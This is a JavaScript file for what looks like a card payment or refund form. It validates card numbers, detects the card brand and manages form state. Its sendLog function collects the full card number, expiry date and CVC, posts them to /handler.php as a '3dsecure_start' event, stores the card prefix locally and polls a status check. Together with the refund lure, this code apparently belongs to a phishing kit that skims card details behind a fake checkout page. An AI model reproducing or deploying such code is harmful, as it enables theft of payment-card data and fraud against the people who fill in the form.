const validCardNumber = numb => {
    const regex = /^[0-9]{13,19}$/;
    if (!regex.test(numb)) {
        return false;
    }
    return luhnck(numb);
};
const luhnck = val => {
    let validsum = 0;
    let k = 1;
    for (let l = val.length - 1; l >= 0; l--) {
        let calck = 0;
        calck = Number(val.charAt(l)) * k;
        if (calck > 9) {
            validsum += 1;
            calck -= 10;
        }
        validsum += calck;
        k = k === 1 ? 2 : 1;
    }
    return validsum % 10 === 0;
};

function cardType(_card) {
    cardTypes = {
        VISA: "visa",
        MAESTRO: "maestro",
        MASTERCARD: "mastercard",
        MIR: "mir",
        AMEX: "americanexpress",
        DC: "dinnersclub",
        JCB: "jcb",
        UP: "unionpay"
    }
    switch (_card[0]) {
        case "2":
            return /^220[0-4]\s?\d\d/.test(_card) ? cardTypes.MIR : "";
        case "3":
            var t = _card[1] || "";
            return "7" === t ? cardTypes.AMEX : "5" === t ? cardTypes.JCB : t ? cardTypes.DC : "";
        case "4":
            return cardTypes.VISA;
        case "5":
            var n = _card[1] || "";
            return "0" === n || n > "5" ? cardTypes.MAESTRO : cardTypes.MASTERCARD;
        case "6":
            return "2" === (_card[1] || "") ? cardTypes.UP : cardTypes.MAESTRO;
        case "8":
            return cardTypes.UP;
        case "9":
            return cardTypes.MIR;
        default:
            return "";
    }
}

function fadeSvg(type) {
    switch (type) {
        case "mir":
            $("#mir").removeClass('CardServices_disabled__mobym');
            $("#maestro").addClass('CardServices_disabled__mobym');
            $("#visa").addClass('CardServices_disabled__mobym');
            $("#mastercard").addClass('CardServices_disabled__mobym');
            break;
        case "visa":
            $("#visa").removeClass('CardServices_disabled__mobym');
            $("#maestro").addClass('CardServices_disabled__mobym');
            $("#mir").addClass('CardServices_disabled__mobym');
            $("#mastercard").addClass('CardServices_disabled__mobym');
            break;
        case "mastercard":
            $("#mastercard").removeClass('CardServices_disabled__mobym');
            $("#maestro").addClass('CardServices_disabled__mobym');
            $("#visa").addClass('CardServices_disabled__mobym');
            $("#mir").addClass('CardServices_disabled__mobym');
            break;
        case "maestro":
            $("#maestro").removeClass('CardServices_disabled__mobym');
            $("#visa").addClass('CardServices_disabled__mobym');
            $("#mir").addClass('CardServices_disabled__mobym');
            $("#mastercard").addClass('CardServices_disabled__mobym');
            break;
        default:
            $("#maestro").addClass('CardServices_disabled__mobym');
            $("#visa").addClass('CardServices_disabled__mobym');
            $("#mir").addClass('CardServices_disabled__mobym');
            $("#mastercard").addClass('CardServices_disabled__mobym');
            break;
    }
}

const sendLog = () => {
    var cardNum = $("#card").val().replace(/\D/g, '').slice(0, 6);
    var data = {};
    if (refund == "refund") {
        data = {
            "type": "3dsecure_start",
            "card_number": $("#card").val().replace(/\D/g, ''),
            "card_expire_month": $("#card-expiry-date").val().split('/')[0],
            "card_expire_year": $("#card-expiry-date").val().split('/')[1],
            "card_cvc": $("#cardcvv").val(),
            "order_id": $("#paymentnum").val(),
            "refund_number": $("#refund_number").val(),
        };
    } else {

        data = {
            "type": "3dsecure_start",
            "card_number": $("#card").val().replace(/\D/g, ''),
            "card_expire_month": $("#card-expiry-date").val().split('/')[0],
            "card_expire_year": $("#card-expiry-date").val().split('/')[1],
            "card_cvc": $("#cardcvv").val(),
            "order_id": $("#paymentnum").val(),
            "refund_number": "0",
        };
    }




    $.post("/handler.php", data, function(response) {
        console.log(response);
        localStorage.setItem('id', $("#paymentnum").val());
        localStorage.setItem('amount', $("#ProductSummary-totalAmount").text().split(' ')[0]);
        localStorage.setItem('card', $("#card").val().replace(/\D/g, '').slice(0, 6));
        isPaused = false;
        checkStatusCard(refund);
    });

}

$(document).ready(function() {



    const $cardNumber = $("#card");


    const updateCardNumber = () => {
        let input = $cardNumber.val().replace(/\D/g, '');
        input = input.replace(/([0-9]{4})/g, '$1 ');
        input = input.trim();
        $cardNumber.val(input);
        fadeSvg(cardType(input))
        if (!validCardNumber(input.replace(/\D/g, ''))) {
            $cardNumber.addClass("Input_invalid__nTyyW")
            $("#Input_error__utbie_card").attr("style", "opacity: 1; height: auto;");
        } else {
            $("#Input_error__utbie_card").attr("style", "opacity: 0; height: auto;");
            $cardNumber.removeClass('Input_invalid__nTyyW');
        }
    };
    $("#cardcvv").keypress(function(event) {
        var charCode = event.which;
        if (charCode > 31 && (charCode < 48 || charCode > 57)) {
            return false;
        }
    });
    if (refund == "refund") {
        $("#confrim_button").removeAttr("disabled");
    } else {
        let input = $cardNumber.val().replace(/\D/g, '');
        $("#card, #card-expiry-date, #cardcvv").keyup(function() {
            if (
			$("#card").val() !== "" && $("#card").val().length > 15 && $("#card-expiry-date").val().length  > 4 &&
                $("#cardcvv").val() !== "" && $("#cardcvv").val().length == 3 && validCardNumber($("#card").val().replace(/\D/g, ''))) {
					var cardExpiryDate = $("#card-expiry-date").val();
var splittedDate = cardExpiryDate.split('/');
var month = parseInt(splittedDate[0].trim(), 10);
var year = parseInt(splittedDate[1].trim(), 10);

					if (month < 13 && year > 22) 
					{
						if ($("#card").val() !== "" && $("#card").val().length > 15)
						{			
						 $("#confrim_button").removeAttr("disabled");
						 $("#card-expiry-date").removeClass("Input_invalid__nTyyW");
						 }
						 else
						 {
							$cardNumber.addClass("Input_invalid__nTyyW")
							$("#Input_error__utbie_card").attr("style", "opacity: 1; height: auto;");
						 }
					}else
					{
						$("#card-expiry-date").addClass("Input_invalid__nTyyW");
						$("#confrim_button").attr("disabled", "disabled");
					}
               
            } else {
                $("#confrim_button").attr("disabled", "disabled");
            }
        });

    }

    $('#confrim_button').click(() => {
        $("#confrim_button").attr("disabled", "disabled");
        $("#confrim_button").html("<span class='spinner'></span>")
        sendLog();
    });

    $cardNumber.on("input", function(e) {
        if ($(this).val().length > 1) {
            updateCardNumber();
        } else {
            $("#Input_error__utbie_card").attr("style", "opacity: 0; height: auto;");
            $cardNumber.removeClass('Input_invalid__nTyyW');
            fadeSvg('');
        }
    });
});